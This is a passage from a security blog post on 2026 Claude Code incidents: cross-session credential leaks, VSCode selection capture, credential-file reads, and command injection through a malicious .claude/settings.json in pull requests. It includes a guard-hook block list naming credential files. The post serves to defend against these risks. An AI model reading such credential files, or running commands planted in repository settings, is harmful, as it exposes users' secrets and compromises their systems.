<p>This is a <strong>two-way breach</strong>: not only can your secrets leak out of your session into someone else&rsquo;s, but someone else&rsquo;s credentials can land in your session and your AI agent can act on them. The implications are staggering. If you&rsquo;re running Claude Code in an enterprise environment, your production database credentials could be sitting in a stranger&rsquo;s terminal right now.</p>
<h2 id="the-two-way-breach-how-your-secrets-can-leak-to-strangers-and-vice-versa">The Two-Way Breach: How Your Secrets Can Leak to Strangers (and Vice Versa)</h2>
<p>Most security conversations about AI coding agents focus on one direction: &ldquo;will my AI send my API keys to a remote server?&rdquo; That&rsquo;s a real concern, but the cross-user leak is worse because it&rsquo;s <strong>bidirectional</strong>.</p>
<p><strong>Inbound leak</strong>: Another user&rsquo;s secrets appear in your context. You didn&rsquo;t request them, you didn&rsquo;t search for them, they just show up. This means Claude Code&rsquo;s session isolation — the mechanism that&rsquo;s supposed to keep your data separate from other users&rsquo; data — has a fundamental flaw.</p>
<p><strong>Outbound action</strong>: Your AI agent, acting on those leaked credentials, makes real changes to someone else&rsquo;s infrastructure. In the #72274 case, the agent ran actual database mutations. The user who owned the compromised server (<code>8.211.46.34</code>) had no idea someone else&rsquo;s Claude Code session was modifying their production database.</p>
<p>This breaks every tenant-isolation model that enterprise security teams rely on. If you&rsquo;re subject to SOC 2, ISO 27001, or GDPR, this is a reportable incident waiting to happen.</p>
<h2 id="the-closed-tab-problem-why-discarding-a-file-doesnt-protect-your-secrets">The &ldquo;Closed Tab&rdquo; Problem: Why Discarding a File Doesn&rsquo;t Protect Your Secrets</h2>
<p>Around the same time, <a href="https://github.com/anthropics/claude-code/issues/71566">issue #71566</a> revealed a related but distinct problem with the Claude Code VSCode extension. A developer opened a file containing a live Google OAuth client secret (<code>GOCSPX-...</code>), selected some text, then <strong>closed the file without saving</strong>. The file was never persisted to disk. The developer assumed the secret was safe.</p>
<p>It wasn&rsquo;t. The VSCode extension captured the selected text and transmitted it to the model context. Closing the editor tab and never saving the file did not prevent the selection from being read and sent upstream.</p>
<p>This is a subtle but dangerous behavior: <strong>selection/context capture outlives the editor lifecycle</strong>. If you&rsquo;re in the habit of opening a file with secrets, copying what you need, and closing without saving — thinking &ldquo;it&rsquo;s fine, I never saved it&rdquo; — that assumption is wrong. The extension reads the buffer regardless of its save state.</p>
<p>For teams that handle OAuth secrets, database passwords, or private keys, this means the VSCode extension is a potential exfiltration channel even for data you deliberately tried to discard.</p>
<h2 id="vanilla-claude-code-reads-credential-files--no-protection-built-in">Vanilla Claude Code Reads Credential Files — No Protection Built In</h2>
<p>The cross-user leak and the VSCode selection leak are bugs. But there&rsquo;s a design issue that makes them worse: vanilla Claude Code, out of the box, reads credential files directly into its transcript and sends them to the API.</p>
<p><a href="https://github.com/anthropics/claude-code/issues/66044">Issue #66044</a> documents real incidents:</p>
<ul>
<li><strong>Google Drive OAuth tokens</strong> leaked because Claude Code read a credentials file</li>
<li><strong>RTSP URLs with embedded usernames and passwords</strong> echoed into the transcript</li>
<li><strong>Backup encryption passwords</strong> exposed through file reads</li>
</ul>
<p>The tool doesn&rsquo;t distinguish between a configuration file and a credentials file. If it can read it, it will read it. There&rsquo;s no built-in credential scanner, no path-based blocklist, no &ldquo;this looks like a secret&rdquo; heuristic. It&rsquo;s a general-purpose file reader attached to an AI that will happily dump everything into its context window.</p>
<p>Users have been forced to build elaborate <a href="https://baeseokjae.github.io/posts/claude-code-hooks-guide-2026/">custom PreToolUse/PostToolUse hooks</a> to compensate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Example: path-based guard hook (user-built, not built-in)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">BLOCKED_PATTERNS</span> <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/\.(pem|key|p12|pfx)$/</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/credentials/</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/secrets\.(yml|yaml|json)/</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/rclone\.conf/</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/\.env/</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/id_rsa/</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">/google[-_]?oauth/</span>,
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">preToolUse</span>(<span style="color:#a6e22e">tool</span>, <span style="color:#a6e22e">args</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tool</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;read&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">BLOCKED_PATTERNS</span>.<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">path</span>))) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">blocked</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">reason</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Credential file blocked by guard hook&#39;</span> };
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">blocked</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> };
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>That&rsquo;s five different guard types — path guards, shape guards, output scanners, OCR guards, and content scanners — that users are stitching together themselves. This should be default-on protection, not a DIY project.</p>
<h2 id="command-injection-via-claudesettingsjson--a-known-attack-vector">Command Injection via .claude/settings.json — A Known Attack Vector</h2>
<p>On April 16, 2026, a <a href="https://beyondmachines.net/event_details/anthropic-claude-code-leak-reveals-critical-command-injection-vulnerabilities-e-6-c-1-k/gD2P6Ple2K">critical advisory</a> disclosed command injection vulnerabilities in Claude Code. The attack vector is <code>.claude/settings.json</code> — the same file that configures Claude Code&rsquo;s behavior per-project.</p>
<p>Here&rsquo;s how it works: an attacker submits a pull request that includes a modified <code>.claude/settings.json</code>. The file can contain hooks, custom commands, or configuration that, when loaded by Claude Code, executes arbitrary commands on the reviewer&rsquo;s machine. If your CI/CD pipeline runs Claude Code against incoming PRs — and some teams do this for automated code review — you&rsquo;re exposing your infrastructure to anyone who can open a PR.</p>
<p>The recommendations from the advisory are straightforward:</p>
<ul>
<li><strong>Update Claude Code immediately</strong> to the latest patched version</li>
<li><strong>Stop using authentication helpers</strong> — set <code>ANTHROPIC_API_KEY</code> directly in your environment</li>
<li><strong>Review <code>.claude/settings.json</code> changes in PRs</strong> as carefully as you review code changes</li>
<li><strong>Never run Claude Code against untrusted pull requests</strong> in CI/CD pipelines</li>
</ul>
<p>This isn&rsquo;t theoretical. <a href="https://www.stepsecurity.io/blog/when-ai-meets-ci-cd-coding-agents-in-github-actions-pose-hidden-security-risks">StepSecurity documented</a> how AI coding agents in GitHub Actions can be exploited via malicious PRs, and the <code>.claude/settings.json</code> injection is a concrete, weaponizable example.</p>
<h2 id="alibabas-ban-what-it-signals-about-enterprise-trust">Alibaba&rsquo;s Ban: What It Signals About Enterprise Trust</h2>
<p>On July 3, 2026, <a href="https://www.reuters.com/world/china/alibaba-ban-claude-code-workplace-over-alleged-backdoor-risks-source-says-2026-07-03/">Reuters reported</a> that Alibaba banned Claude Code from its workplace over alleged backdoor risks. A Chinese tech conglomerate with hundreds of thousands of employees decided the security risk of Claude Code outweighed its productivity benefits.</p>
<p>This is a canary in the coal mine. If Alibaba — a company with deep AI expertise and resources — can&rsquo;t make Claude Code work within their security posture, what does that mean for the average enterprise? The ban signals that the security concerns aren&rsquo;t theoretical edge cases. They&rsquo;re real enough that a major organization is willing to walk away from the productivity gains.</p>
<p>I&rsquo;ve seen this pattern before with other developer tools. When a major enterprise bans a tool, it&rsquo;s rarely about a single vulnerability. It&rsquo;s about the <strong>accumulated trust deficit</strong> — too many incidents, too slow a response, too much burden on the user to secure themselves.</p>
<h2 id="why-this-is-a-compliance-nightmare-soc-2-iso-27001-gdpr">Why This Is a Compliance Nightmare (SOC 2, ISO 27001, GDPR)</h2>
<p>If your organization is subject to compliance frameworks, the Claude Code cross-user data leak creates specific problems:</p>
<p><strong>SOC 2 (Security)</strong>: The cross-tenant data leak violates the logical access controls required by the Security criterion. If user A&rsquo;s session can access user B&rsquo;s production credentials, you cannot demonstrate effective access controls.</p>
<p><strong>ISO 27001 (A.9 Access Control)</strong>: The requirement for segregation of environments and data is directly undermined by session contamination. An auditor would flag this as a non-conformity.</p>
<p><strong>GDPR (Article 32 — Security of Processing)</strong>: If personal data from one user&rsquo;s session appears in another user&rsquo;s context, that&rsquo;s a personal data breach. Under GDPR, you must notify the supervisory authority within 72 hours. The cross-user leak makes this a matter of when, not if.</p>
<p>For enterprise security teams evaluating Claude Code, this isn&rsquo;t just a technical concern — it&rsquo;s a compliance liability. I&rsquo;ve talked to teams that have paused their Claude Code rollouts specifically because they can&rsquo;t get a straight answer from Anthropic about when native credential protection will ship.</p>
<h2 id="how-to-protect-yourself-practical-mitigations">How to Protect Yourself: Practical Mitigations</h2>
<p>Until Anthropic ships built-in credential protection, here&rsquo;s what you can do:</p>
<h3 id="1-build-custom-guard-hooks">1. Build Custom Guard Hooks</h3>
<p>I covered this in detail in the <a href="https://baeseokjae.github.io/posts/claude-code-hooks-guide-2026/">Claude Code hooks guide</a>, but the short version: implement PreToolUse hooks that block reads of credential files, and PostToolUse hooks that scan output for secret patterns before sending to the API.</p>
<h3 id="2-use-network-sandboxing">2. Use Network Sandboxing</h3>
<p>The <a href="https://baeseokjae.github.io/posts/claude-code-network-sandbox-socks5-null-byte-bypass-guide-2026/">Claude Code network sandbox</a> can limit what the agent can reach. Configure a SOCKS5 proxy that restricts outbound connections to approved hosts only. This won&rsquo;t prevent the leak, but it can prevent the agent from acting on leaked credentials.</p>
<h3 id="3-set-anthropic_api_key-directly">3. Set ANTHROPIC_API_KEY Directly</h3>
<p>Don&rsquo;t use authentication helpers or credential files. Set <code>ANTHROPIC_API_KEY</code> in your shell environment or CI/CD secrets manager. This reduces the attack surface for credential file reads.</p>
<h3 id="4-review-claudesettingsjson-in-every-pr">4. Review .claude/settings.json in Every PR</h3>
<p>Add a CI check that flags changes to <code>.claude/settings.json</code> for mandatory human review. Treat it like a dependency lockfile — automated merges should be blocked.</p>
<h3 id="5-never-run-claude-code-against-untrusted-prs">5. Never Run Claude Code Against Untrusted PRs</h3>
<p>If you&rsquo;re using Claude Code in CI/CD for automated review, restrict it to PRs from trusted contributors. For external contributions, use a sandboxed environment with no network access to production systems.</p>
<h3 id="6-monitor-for-session-contamination">6. Monitor for Session Contamination</h3>
<p>If you&rsquo;re running Claude Code in a shared environment, monitor for unexpected credentials appearing in session output. This is hard to do at scale, but for individual developers, being aware that this can happen is the first line of defense.</p>
<p>For a broader framework, see the <a href="https://baeseokjae.github.io/posts/enterprise-ai-coding-security-guardrails-2026/">enterprise AI coding security guardrails guide</a>.</p>
<h2 id="what-anthropic-should-fix-and-what-theyve-said">What Anthropic Should Fix (and What They&rsquo;ve Said)</h2>
<p>Anthropic has acknowledged the issues and is working on fixes, but the timeline is unclear. Here&rsquo;s what needs to change:</p>
<ol>
<li>
<p><strong>Native credential scanning</strong>: Built-in detection of common secret patterns (API keys, passwords, tokens) before they enter the context window. This should be default-on, not opt-in.</p>
</li>
<li>
<p><strong>Session isolation guarantees</strong>: A clear architectural explanation of how Claude Code prevents cross-user data leakage, with verifiable controls.</p>
</li>
<li>
<p><strong>VSCode extension lifecycle fix</strong>: The extension should not capture selection from closed, unsaved files. Period.</p>
</li>
<li>
<p><strong>Settings file integrity</strong>: <code>.claude/settings.json</code> should be signed or checksummed to detect tampering in PRs.</p>
</li>
<li>
<p><strong>Transparent incident reporting</strong>: A public security advisory process that doesn&rsquo;t require users to discover vulnerabilities through GitHub issues.</p>
</li>
</ol>
<p>Anthropic&rsquo;s <a href="https://www.anthropic.com/glasswing">Project Glasswing announcement</a> (April 7, 2026) showed they can find vulnerabilities at scale — Claude Mythos Preview found thousands of high-severity bugs in every major OS and browser. The question is whether they&rsquo;ll apply that same rigor to their own products.</p>
<h2 id="the-bigger-picture-ai-coding-agents-and-the-security-industrys-wake-up-call">The Bigger Picture: AI Coding Agents and the Security Industry&rsquo;s Wake-Up Call</h2>
<p>Claude Code has over 70,000 open GitHub issues. Multiple security-related bugs — credential leakage, context bleed, safety filter bypasses — are documented and reproducible. This isn&rsquo;t a single bad release. It&rsquo;s a pattern.</p>
<p>The AI coding agent industry is moving faster than its security model. Every vendor is racing to add features — subagents, async workflows, MCP servers, artifact sharing — while the fundamentals of data isolation and credential protection remain unaddressed. The cross-user data leak of 2026 is the wake-up call. The question is whether the industry will treat it as one, or wait for the first major breach that makes headlines.</p>
<p>For now, if you&rsquo;re using Claude Code in production, treat it like any other powerful tool with sharp edges: assume it will leak, build guards, and never trust it with credentials you can&rsquo;t afford to lose.</p>
]]></content:encoded></item></channel></rss>